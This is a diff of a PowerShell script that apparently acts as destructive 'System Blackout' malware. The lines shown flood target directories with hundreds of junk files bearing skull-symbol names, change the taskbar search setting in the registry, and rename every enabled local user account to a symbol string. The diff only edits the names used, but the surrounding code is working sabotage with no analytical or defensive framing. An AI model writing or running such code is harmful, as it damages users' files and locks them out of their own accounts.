@@ -21,7 +21,7 @@ foreach ($path in $pathsToDelete) {
 
     for ($i = 1; $i -le 999; $i++) {
         $randomIteration = Get-Random -Minimum 100 -Maximum 1000
-        $newFileName = "☠☠☠☠☠⓿⌓⓿☠☠☠☠☠_$randomIteration.txt"
+        $newFileName = "☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠☠_$randomIteration.txt"
         $newFilePath = Join-Path -Path $path -ChildPath $newFileName
         New-Item -Path $newFilePath -ItemType File -Force | Out-Null
     }
@@ -40,7 +40,7 @@ Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 # Change the user account names
 $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
 foreach ($user in $users) {
-    $newName = "S̶y̶s̶t̶e̶m̶⓿⌓⓿B̶l̶a̶c̶k̶o̶u̶t̶"
+    $newName = "⓿⮟⓿"
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
 
